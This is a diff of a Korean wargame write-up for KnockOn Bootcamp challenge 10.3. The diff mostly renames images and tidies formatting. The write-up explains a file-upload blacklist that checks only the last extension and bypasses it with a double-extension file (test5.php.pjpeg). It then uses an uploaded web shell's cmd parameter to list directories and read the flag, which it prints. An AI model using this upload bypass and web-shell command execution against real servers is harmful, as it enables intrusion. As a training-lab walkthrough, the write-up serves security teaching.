@@ -1,53 +1,35 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 10.3 Can't access rerevenge!!!"
+title: "KnockOn Bootcamp 2nd - 10.3 Can't Access Rerevenge!!! - Double Extension Bypass"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - File Upload
-  - Command Injection
-last_modified_at: 2024-09-15T21:30:00-05:00
+  - Filter Bypass
+  - Double Extension
+  - Web Shell
+last_modified_at: 2024-09-16T11:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10020/>
 
-![10.3 Can't access rerevenge!!! 1](/assets/images/writeup/web-hacking/knock-on/10-3_FILE_1.png)
+![10.3 Can't access rerevenge!!! 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-1.png)
 
-![10.3 Can't access rerevenge!!! 2](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_2.png)
-
-|
-
-|
-
-|
+![10.3 Can't access rerevenge!!! 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-2.png)
 
 ### 목표
 
----
-
 서버 파일에서 flag 찾기
-
-|
 
 ### 공격 기법
 
----
-
 File Upload
-
-Command Injection
-
-|
-
-|
-
-|
+- Filter Bypass
+- Double Extension
+- Web Shell
 
 ## 문제 코드
 
@@ -228,25 +210,15 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['title'] && $_POST['content']
 ?>
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### upload.php
-
----
 
 ```php
 $blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf","htaccess");
 ```
 
 `htaccess`가 추가됨
-
-|
 
 ```php
 $fileExtension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
@@ -256,13 +228,7 @@ $fileExtension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION
 
 대신 마지막 확장자를 인식하는건 여전함 `test.php.pjpg`로 쓰면, 마지막 확장자인 `.pjpg`만 추출해서 블랙리스트와 대조
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```php
 <?php
@@ -272,57 +238,41 @@ $fileExtension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION
 
 `*.php.pjpeg` 또는 `*.php.pjpg` 파일 업로드
 
-`*.php.jpg`, `*.php.txt`는 서버에서 php로 인식이 안됨..
-
-|
+`*.php.jpg`, `*.php.txt`는 서버에서 php로 인식이 안됨
 
 ```sh
 http://war.knock-on.org:10020/uploads/test5.php.pjpeg
 ```
 
-![10.3 Can't access rerevenge!!! 3](/assets/images/writeup/web-hacking/knock-on/10-3_FILE_2.png)
+![10.3 Can't access rerevenge!!! 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-2.png)
 
 성공
-
-|
 
 ```sh
 http://war.knock-on.org:10020/uploads/test5.php.pjpeg?cmd=ls
 ```
 
-![10.3 Can't access rerevenge!!! 4](/assets/images/writeup/web-hacking/knock-on/10-3_FILE_3.png)
+![10.3 Can't access rerevenge!!! 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-3.png)
 
 커맨드 실행 가능
-
-|
 
 ```sh
 http://war.knock-on.org:10020/uploads/test5.php.pjpeg?cmd=ls%20../../../../
 ```
 
-![10.3 Can't access rerevenge!!! 5](/assets/images/writeup/web-hacking/knock-on/10-3_FILE_4.png)
+![10.3 Can't access rerevenge!!! 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-4.png)
 
 flag 발견
-
-|
 
 ```sh
 http://war.knock-on.org:10020/uploads/test5.php.pjpeg?cmd=cat%20../../../../flag
 ```
 
-![10.3 Can't access rerevenge!!! 6](/assets/images/writeup/web-hacking/knock-on/10-3_FILE_5.png)
+![10.3 Can't access rerevenge!!! 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-3-file-5.png)
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### test5.php.pjpeg
-
----
 
 ```php
 <?php
@@ -330,28 +280,14 @@ http://war.knock-on.org:10020/uploads/test5.php.pjpeg?cmd=cat%20../../../../flag
 ?>
 ```
 
-|
-
 ### URL
-
----
 
 ```sh
 http://war.knock-on.org:10020/uploads/test5.php.pjpeg?cmd=cat%20../../../../flag
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{you_solve_this_with_higher_case?}
 ```
-
-|
-
----
